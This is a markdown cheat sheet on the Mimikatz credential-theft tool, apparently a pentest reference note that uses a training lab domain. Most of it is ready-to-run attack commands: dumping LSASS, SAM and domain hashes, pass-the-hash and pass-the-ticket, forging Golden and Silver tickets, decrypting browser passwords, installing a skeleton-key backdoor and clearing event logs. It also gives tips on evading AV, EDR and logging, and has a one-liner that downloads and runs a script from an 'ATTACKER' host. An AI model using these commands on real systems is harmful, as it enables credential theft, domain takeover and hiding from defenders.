# Mimikatz

**Tags:** `#mimikatz` `#credentialdumping` `#passthehash` `#passtheticket` `#kerberos` `#dcsync` `#goldenticket` `#lsass` `#windows` `#postexploitation`

The definitive Windows credential extraction tool. Reads LSASS memory for plaintext passwords, NTLM hashes, and Kerberos tickets; dumps SAM, LSA secrets, and NTDS via DCSync; forges Golden/Silver tickets; and enables every major Windows lateral movement technique. Written by Benjamin Delpy (gentilkiwi).

**Source:** https://github.com/gentilkiwi/mimikatz
**Install:** Download pre-built from releases (`mimikatz_trunk.zip`), or compile from source. Also available as `Invoke-Mimikatz.ps1` (PowerSploit) for in-memory execution.

```cmd
:: Interactive mode
mimikatz.exe

:: One-liner (command + exit)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

:: Multiple commands
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

> [!warning] **Requires admin/SYSTEM** — Most modules require local admin at minimum. `lsadump::dcsync` requires Domain Admin or replication rights. `token::elevate` escalates from admin to SYSTEM context (needed for SAM/LSA dumps).

---

## First Commands — Always Run These

```cmd
:: Grant SeDebugPrivilege — required for most operations
privilege::debug

:: Verify it worked — look for "Privilege '20' OK"

:: Elevate to SYSTEM context (needed for SAM, LSA secrets, some LSASS reads)
token::elevate

:: Check current token/privileges
token::whoami
```

---

## LSASS Memory Dumps — Live Credential Extraction

Reads credentials from active logon sessions in LSASS memory.

```cmd
:: Dump all credentials from all logon sessions
sekurlsa::logonpasswords

:: Dump all credentials — full detail
sekurlsa::logonpasswords full

:: Specific credential providers only
sekurlsa::wdigest        :: plaintext passwords (requires WDigest enabled — pre-Win8.1 or registry hack)
sekurlsa::msv            :: NTLM hashes (MSV1_0 provider)
sekurlsa::kerberos       :: Kerberos credentials
sekurlsa::tspkg          :: TS (Terminal Services) credentials
sekurlsa::livessp        :: LiveSSP credentials (Microsoft accounts)
sekurlsa::ssp            :: Security Support Provider credentials
sekurlsa::credman        :: Windows Credential Manager entries
sekurlsa::cloudap        :: Azure AD / PRT tokens (AADJ machines)

:: Encryption keys — AES256, AES128, RC4 (needed for OverPass-the-Hash)
sekurlsa::ekeys
```

**Enable WDigest for plaintext password capture (requires reboot or user re-logon):**
```cmd
:: Enable WDigest — makes plaintext passwords available in memory
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

:: Disable (cleanup)
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
```

---

## SAM Database — Local Account Hashes

Dumps local user NTLM hashes from the SAM registry hive. Requires SYSTEM.

```cmd
privilege::debug
token::elevate

:: Dump SAM (local accounts)
lsadump::sam

:: Dump SAM from offline hive files (from a mounted disk or shadow copy)
lsadump::sam /sam:C:\sam.hive /system:C:\system.hive

:: With registry export (get hives first)
reg save HKLM\SAM C:\sam.hive
reg save HKLM\SYSTEM C:\system.hive
lsadump::sam /sam:C:\sam.hive /system:C:\system.hive
```

---

## LSA Secrets — Service Account & Cached Credentials

Dumps LSA secrets from registry — service account passwords, DPAPI master keys, cached domain logon hashes (DCC2).

```cmd
privilege::debug
token::elevate

:: Dump LSA secrets
lsadump::secrets

:: LSA secrets + SAM in one shot
lsadump::secrets
lsadump::sam

:: Offline from hives
lsadump::secrets /system:C:\system.hive /security:C:\security.hive
```

**LSA secrets contain:**
- `_SC_*` — service account plaintext passwords
- `DefaultPassword` — autologon password
- `DPAPI_SYSTEM` — DPAPI machine master key
- `NL$KM` — cached logon encryption key
- `$MACHINE.ACC` — machine account hash

---

## DCSync — Remote NTDS Dump

Impersonates a Domain Controller replication partner to pull password hashes for any account without touching the DC directly. Requires: Domain Admin, or explicit `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` rights.

```cmd
:: Dump a specific user
lsadump::dcsync /domain:inlanefreight.htb /user:Administrator
lsadump::dcsync /domain:inlanefreight.htb /user:krbtgt

:: Dump all domain hashes (slow — every account)
lsadump::dcsync /domain:inlanefreight.htb /all

:: Target a specific DC
lsadump::dcsync /domain:inlanefreight.htb /user:krbtgt /dc:DC01.inlanefreight.htb

:: Dump from non-DC machine (most common use case — run from any domain member)
:: Just need the /domain flag — mimikatz will locate a DC automatically
lsadump::dcsync /domain:inlanefreight.htb /user:Administrator
```

> [!note] **krbtgt hash** — Always dump the `krbtgt` account hash. It's used to forge Golden Tickets and is the most valuable single credential in a domain. Two consecutive resets are required to invalidate it.

---

## Pass the Hash (PTH)

Spawns a new process authenticated with an NTLM hash — no plaintext password needed.

```cmd
:: Spawn CMD as user using NTLM hash
sekurlsa::pth /user:Administrator /domain:inlanefreight.htb /ntlm:64f12cddaa88057e06a81b54e73b949b /run:cmd.exe

:: Spawn PowerShell
sekurlsa::pth /user:svc_backup /domain:inlanefreight.htb /ntlm:7c6a180b36896a0a8c02787eeafb0e4c /run:powershell.exe

:: Local account (use '.' for domain)
sekurlsa::pth /user:Administrator /domain:. /ntlm:64f12cddaa88057e06a81b54e73b949b /run:cmd.exe

:: The spawned process runs in a new logon session with the specified hash
:: Use it to access network resources: net use \\target\c$, PsExec, etc.
```

---

## Kerberos Ticket Extraction

```cmd
:: Export all Kerberos tickets to .kirbi files in current directory
privilege::debug
sekurlsa::tickets /export

:: List tickets in memory (no export)
kerberos::list
kerberos::list /export    :: same as sekurlsa::tickets /export but from kerberos module

:: Tickets ending in $ are machine account tickets (less useful)
:: Tickets for krbtgt are TGTs — highest value
```

---

## Pass the Ticket (PTT)

Inject a Kerberos ticket into the current session.

```cmd
:: Import a .kirbi file
kerberos::ptt "C:\path\to\[0;6c680]-2-0-40e10000-jsmith@krbtgt-INLANEFREIGHT.HTB.kirbi"

:: Verify ticket is loaded
kerberos::list

:: Use the ticket — access resources as the ticket owner
dir \\DC01\C$
```

---

## OverPass the Hash / Pass the Key

Converts an NTLM hash or AES key into a Kerberos TGT — more OPSEC-friendly than PTH (uses Kerberos instead of NTLM, bypasses NTLMv2-only restrictions).

```cmd
:: First dump encryption keys
privilege::debug
sekurlsa::ekeys

:: OverPass the Hash — spawn process using NTLM hash as Kerberos key (RC4)
sekurlsa::pth /user:jsmith /domain:inlanefreight.htb /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f /run:cmd.exe

:: Pass the Key — use AES256 key (stealthier — matches normal Kerberos auth)
sekurlsa::pth /user:jsmith /domain:inlanefreight.htb /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /run:cmd.exe

:: The new CMD/PS session will request a TGT using the supplied key
:: Then klist to verify the TGT was issued
```

---

## Golden Ticket

Forge a TGT for any user (including non-existent ones) using the `krbtgt` NTLM hash. Valid until the krbtgt password is changed **twice**. Works even if the account doesn't exist or is disabled.

```cmd
:: Requirements:
:: - krbtgt NTLM hash (from DCSync or NTDS dump)
:: - Domain SID

:: Get domain SID
lsadump::dcsync /domain:inlanefreight.htb /user:krbtgt
:: Note the SID from output: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX

:: Forge Golden Ticket
kerberos::golden /domain:inlanefreight.htb /sid:S-1-5-21-3842939050-3880317879-2865463114 /rc4:9d765b482771505cbe97411065964d5f /user:hacker /ptt

:: With AES256 (more OPSEC-friendly)
kerberos::golden /domain:inlanefreight.htb /sid:S-1-5-21-3842939050-3880317879-2865463114 /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /user:hacker /ptt

:: Save to file instead of injecting
kerberos::golden /domain:inlanefreight.htb /sid:S-1-5-21-3842939050-3880317879-2865463114 /rc4:9d765b482771505cbe97411065964d5f /user:hacker /ticket:golden.kirbi

:: Common flags
:: /groups:512,513,518,519,520  — add RID groups (512=DA, 519=Enterprise Admins)
:: /id:500                      — RID of forged user (500 = built-in Administrator)
:: /startoffset:-10             — ticket start time (-10 min skew)
:: /endin:600                   — ticket lifetime in minutes (default: 10 hours)
:: /renewmax:10080              — max renewal in minutes (default: 7 days)
```

---

## Silver Ticket

Forge a TGS for a specific service using the **service account's** NTLM hash — no KDC contact required. More stealthy than Golden Ticket (no TGT request). Valid until the service account password changes.

```cmd
:: Requirements:
:: - Service account NTLM hash
:: - Domain SID
:: - Target computer FQDN
:: - Service SPN type

:: Common service types
:: cifs     — SMB file access (\\server\c$)
:: host     — scheduled tasks, WMI, PSExec
:: http     — WinRM, IIS
:: ldap     — DCSync (on DC), AD queries
:: mssql    — SQL Server

:: Forge Silver Ticket for CIFS (file share access)
kerberos::golden /domain:inlanefreight.htb /sid:S-1-5-21-3842939050-3880317879-2865463114 /target:SQL01.inlanefreight.htb /service:cifs /rc4:e3a0168bc21cfb88b95c954a5b18f57c /user:Administrator /ptt

:: Forge Silver Ticket for HOST (code execution via scheduled tasks/WMI)
kerberos::golden /domain:inlanefreight.htb /sid:S-1-5-21-3842939050-3880317879-2865463114 /target:DC01.inlanefreight.htb /service:host /rc4:9d765b482771505cbe97411065964d5f /user:Administrator /ptt

:: Forge Silver Ticket for LDAP (DCSync without DA — if you have the DC machine account hash)
kerberos::golden /domain:inlanefreight.htb /sid:S-1-5-21-3842939050-3880317879-2865463114 /target:DC01.inlanefreight.htb /service:ldap /rc4:9d765b482771505cbe97411065964d5f /user:Administrator /ptt
lsadump::dcsync /domain:inlanefreight.htb /user:krbtgt
```

---

## Token Manipulation

```cmd
:: Escalate from admin to SYSTEM (required for SAM/LSA dumps)
token::elevate

:: Impersonate a specific user's token (must have a token available in session)
token::list                      :: list all tokens
token::impersonate /id:<id>      :: impersonate by token ID

:: Revert to original token
token::revert

:: Run process under a different token
token::run /process:cmd.exe /id:<id>
```

---

## DPAPI — Protected Secret Decryption

DPAPI protects browser saved passwords, credential manager entries, private keys, etc.

```cmd
:: Dump DPAPI master keys (requires SYSTEM for machine keys, user context for user keys)
sekurlsa::dpapi

:: Dump all cached DPAPI master keys
dpapi::cache

:: Decrypt a DPAPI blob with a master key
dpapi::blob /masterkey:<hex-key> /in:C:\path\to\blob

:: Decrypt Chrome/Edge saved passwords (requires user's master key)
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"
dpapi::chrome /in:"%localappdata%\Microsoft\Edge\User Data\Default\Login Data"

:: Dump machine DPAPI key (with SYSTEM — decrypts machine-context blobs)
lsadump::secrets   :: DPAPI_SYSTEM key is in here
```

---

## Skeleton Key (Persistence Backdoor)

Patches LSASS to accept a master password for any domain account — legitimate passwords still work. **Does not survive a reboot and only affects the DC it's run on.**

```cmd
:: Install skeleton key on DC (run ON the DC as Domain Admin)
privilege::debug
misc::skeleton

:: Now ANY account in the domain can authenticate with password "mimikatz"
:: net use \\DC01\c$ /user:Administrator mimikatz
:: psexec \\DC01 -u Administrator -p mimikatz cmd
```

> [!warning] **Destructive / very noisy** — Skeleton key patches a live DC's LSASS process. Will crash LSASS if anything goes wrong (DoS the DC). Only use with explicit authorization and extreme caution.

---

## Event Log & Audit Clearing

```cmd
:: Clear Windows Security event log
event::clear

:: Drop event log service (stops new events — requires SYSTEM)
event::drop
```

---

## Dumping LSASS Offline

When you can't run mimikatz directly (AV, EDR), dump LSASS to disk and parse offline.

```cmd
:: Method 1: Task Manager (GUI — right-click lsass.exe → Create Dump File)

:: Method 2: ProcDump (Sysinternals — often not flagged)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

:: Method 3: comsvcs.dll (living off the land)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\lsass.dmp full

:: Method 4: Task Manager via WMI
wmic process where name="lsass.exe" get ProcessId
:: Use the PID with comsvcs.dll above
```

```cmd
:: Parse dump file offline with mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

```bash
# Parse dump on Linux with pypykatz
pip install pypykatz
pypykatz lsa minidump lsass.dmp
pypykatz lsa minidump lsass.dmp | grep -E "Username|NTLM|Password"
```

---

## Running Without Dropping to Disk

```powershell
# Invoke-Mimikatz (PowerSploit) — loads mimikatz entirely in memory
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
Invoke-Mimikatz -DumpCreds                                    :: shortcut for logonpasswords
Invoke-Mimikatz -DumpCerts                                    :: dump certificates
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'
```

```cmd
:: Execute-Assembly via C2 (Cobalt Strike / Havoc / Sliver)
execute-assembly /path/to/mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

:: Meterpreter — kiwi extension (built-in mimikatz)
meterpreter> load kiwi
meterpreter> creds_all              :: all credentials
meterpreter> lsa_dump_sam           :: SAM hashes
meterpreter> lsa_dump_secrets       :: LSA secrets
meterpreter> dcsync_ntlm krbtgt     :: DCSync
meterpreter> golden_ticket_create   :: Golden Ticket
```

---

## Common Module Reference

| Module | Command | Purpose |
|---|---|---|
| `privilege` | `privilege::debug` | Enable SeDebugPrivilege |
| `token` | `token::elevate` | Escalate to SYSTEM |
| `sekurlsa` | `sekurlsa::logonpasswords` | Dump LSASS credentials |
| `sekurlsa` | `sekurlsa::ekeys` | Dump Kerberos encryption keys |
| `sekurlsa` | `sekurlsa::tickets /export` | Export Kerberos tickets |
| `sekurlsa` | `sekurlsa::pth` | Pass the Hash |
| `sekurlsa` | `sekurlsa::dpapi` | Dump DPAPI master keys |
| `sekurlsa` | `sekurlsa::minidump` | Load offline LSASS dump |
| `lsadump` | `lsadump::sam` | Dump local SAM hashes |
| `lsadump` | `lsadump::secrets` | Dump LSA secrets |
| `lsadump` | `lsadump::dcsync` | DCSync (remote NTDS dump) |
| `kerberos` | `kerberos::ptt` | Pass the Ticket (inject) |
| `kerberos` | `kerberos::list` | List tickets in memory |
| `kerberos` | `kerberos::golden` | Forge Golden/Silver ticket |
| `kerberos` | `kerberos::purge` | Clear all tickets from session |
| `dpapi` | `dpapi::chrome` | Decrypt browser saved passwords |
| `dpapi` | `dpapi::blob` | Decrypt a DPAPI blob |
| `token` | `token::list` | List available tokens |
| `misc` | `misc::skeleton` | Install skeleton key on DC |
| `event` | `event::clear` | Clear security event log |

---

## OPSEC Notes

- **AV/EDR** — mimikatz.exe is heavily signatured. Use Invoke-Mimikatz (in-memory), execute-assembly, or obfuscated variants. LSASS dump + offline parsing is stealthier.
- **PPL (Protected Process Light)** — Windows 8.1+ can mark LSASS as PPL, blocking standard reads. Bypass: `!+` (mimidrv.sys kernel driver) or use a vulnerable driver (BYOVD). Alternatively dump via comsvcs.dll.
- **Credential Guard** — Isolates LSASS in a VSM (Virtualization Security Module). `sekurlsa::logonpasswords` returns no plaintext credentials. Only Kerberos tickets can be extracted. DCSync still works if you have rights.
- **ETW / Event 4624, 4625, 4672** — SeDebugPrivilege grant and LSASS reads generate events. `event::drop` can suppress further logging on the current host.
- **Use AES256** — When forging tickets or doing OverPass-the-Hash, use AES256 keys where possible. RC4 (NTLM) usage is an anomaly detection indicator in modern environments.

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
